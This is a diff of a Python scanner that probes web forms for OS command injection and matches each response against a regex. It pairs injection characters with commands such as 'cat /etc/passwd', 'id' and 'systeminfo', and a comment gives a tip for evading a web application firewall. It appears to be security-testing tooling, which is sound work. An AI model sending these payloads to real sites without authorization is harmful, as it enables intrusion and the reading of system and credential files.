@@ -10,25 +10,22 @@ class ScanCommandInject(ActiveScanner):
         self.host_os = host_os
         super().__init__(visited_urls, log_file)
 
-    def initialise_commands(self):
-        # all payloads working with matching regex
+    def initialise_injection_characters(self):
+        self.injection_characters = [r";", r"\n", r"&", r"|", r"&&", r"||", r")"
+        ]
+        return self.injection_characters
+
+    def init_payloads_matches(self):
         linux_payloads = [
-            r"cat /etc/passwd",
-            r"mkdir abcdefghijkl && ls",
-            r"touch abcdefghijkl.txt && ls",
-            r"mkdir abcdefghijkl; ls",
-            r"touch abcdefghijkl.txt; ls",
-            r"ls /",
-            r"id",
-            r"uname -a"
+            [r"cat /etc/passwd", re.compile(r"root:.:0:0")],
+            [r"ls /", re.compile(r"\bbin\b.*\broot\b.*\bvar\b.*", re.DOTALL)],
+            [r"uname -a", re.compile(r"Linux .+ \d+\.\d+\.\d+[-\w]* .*")],
+            [r"id", re.compile(r"uid=[0-9]+.*gid=[0-9]+.*groups=.*")]
         ]
         windows_payloads = [
-            r"type C:\Windows\system.ini",
-            r"mkdir abcdefghijkl && dir",
-            r"echo. > abcdefghijkl.txt && dir",
-            r"dir C:\\",
-            r"whoami",
-            r"systeminfo"
+            [r"type C:\Windows\system.ini", re.compile(r"^\[drivers]$")],
+            [r"dir C:\\", re.compile(r"Directory of C:\\")],
+            [r"systeminfo", re.compile(r"Host Name"),]
         ]
         if self.host_os == "unix":
             return linux_payloads
@@ -38,100 +35,57 @@ class ScanCommandInject(ActiveScanner):
             self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
             return linux_payloads
 
-    def initialise_injection_characters(self):
-        self.injection_characters = [r";", r"\n", r"&", r"|", r"&&", r"||", r")"
-        ]
-        return self.injection_characters
-
 # use tabs to pass waf %09 or  ${IFS}
-    def initialise_response_patterns(self):
-        linux_command_patterns = [
-            re.compile(r"root:.*:0:0:.*"),  # cat passwd
-            re.compile(r"uid=[0-9]+.*gid=[0-9]+.*groups=.*"), # id
-            re.compile(r"abcdefghijlk"), #touch and mkdir
-            re.compile(r"bin.*"), # ls /
-            re.compile(r"Linux .+ \d+\.\d+\.\d+[-\w]* .*"),  # Pattern for 'uname -a'
-        ]
-        windows_command_patterns = [
-            re.compile(r"^\[drivers]$"),
-            re.compile(r"abcdefghijlk.*"),
-            re.compile(r"abcdefghijlk.txt.*"),
-            re.compile(r"Volume in drive C has no label."),
-            re.compile(r"User Name"),
-            re.compile(r"Host Name"),
-            re.compile(r"Directory of C:\\Windows")
-        ]
-
-        if self.host_os == "unix":
-            return linux_command_patterns
-        elif self.host_os == "windows":
-            return windows_command_patterns
-        else:
-            self.logger.info("\tInvalid or unspecified host operating system. Defaulting to Unix payloads.")
-            return linux_command_patterns
-
     def construct_payloads(self):
         injection_characters = self.initialise_injection_characters()
-        commands = self.initialise_commands()
+        payloads_matches = self.init_payloads_matches()
         payloads = []
-        for command in commands:
+        for payload_match in payloads_matches:
             for injection_character in injection_characters:
-                payload = injection_character + command
-                payloads.append(payload)
+                payload = injection_character + payload_match[0]
+                payloads.append((payload, payload_match[1]))
         return payloads
 
     def test_payloads(self, target_url, form_fields):
-        # Open the file containing command injection payloads
         payloads = self.construct_payloads()
-        # Initialise a flag to track if any potential vulnerability is found
         potential_vulnerability_found = False
-        for payload in payloads:
+        for payload, pattern in payloads:
             self.logger.info(f"\tTesting payload: {payload} on {target_url}")
-            # Prepare form data with command injection payload
             form_data = {}
-            for field_name, _ in form_fields:
-                form_data[field_name] = payload
+            for field_tuple in form_fields:
+                form_data[field_tuple[0]] = payload
             try:
-                # Get the form method (post or get)
                 form_method = form_data.get('method', 'post').lower()
-                # Get the action URL or set it to the target URL if not found
                 action = form_data.get('action', target_url)
-                # Extract input fields from the form_data
                 inputs = [key for key in form_data.keys() if key != 'method' and key != 'action']
-                # Prepare post data for submission
                 post_data = {}
                 for input_name in inputs:
                     post_data[input_name] = form_data[input_name]
-                # Check if method is post or get
+                proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
                 if form_method == 'post':
-                    response = requests.post(action, data=post_data)
+                    response = requests.post(action, data=post_data) # , proxies=proxies
                 else:
-                    response = requests.get(action, params=post_data)
-                # Call check response method to detect potential vulnerabilities
-                if self.check_response(response, payload, target_url):
+                    response = requests.get(action, params=post_data) # , proxies=proxies
+                if self.check_response(response, pattern, payload, target_url):
                     potential_vulnerability_found = True
-                    break  # Break out of the loop if vulnerability found
+                    break
             except Exception as e:
                 self.logger.error(
                     f"\tAn error occurred while sending form with command injection payload to {target_url}: {e}")
 
-        # After testing all payloads, if no potential vulnerability is found, print the message
         if not potential_vulnerability_found:
             self.logger.info(f"\tNo command injection vulnerability found at: {target_url}")
             print(f"\033[32m[+] No command injection vulnerability found at: {target_url}\033[0m")
             self.test_blind_command_injection(target_url, form_fields)
 
-    def check_response(self, response, payload, url):
-        # Check if response indicates successful injection
+    def check_response(self, response, pattern, payload, url):
         if response.status_code == 200:
-            # Check if the response contains common command injection error messages or patterns
-            for pattern in self.initialise_response_patterns():
-                if pattern.search(response.text):
-                    self.logger.warning(
-                        f"Command injection vulnerability found at: {url} with payload: {payload}")
-                    print(
-                        f"\033[31m[+] Command injection vulnerability found at: {url} with payload: {payload}\033[0m")
-                    return True
+            if pattern.search(response.text):
+                self.logger.warning(
+                    f"Command injection vulnerability found at: {url} with payload: {payload}")
+                print(
+                    f"\033[31m[+] Command injection vulnerability found at: {url} with payload: {payload}\033[0m")
+                return True
         else:
             self.logger.error(f"\tUnexpected response code ({response.status_code}) for {url}")
         return False
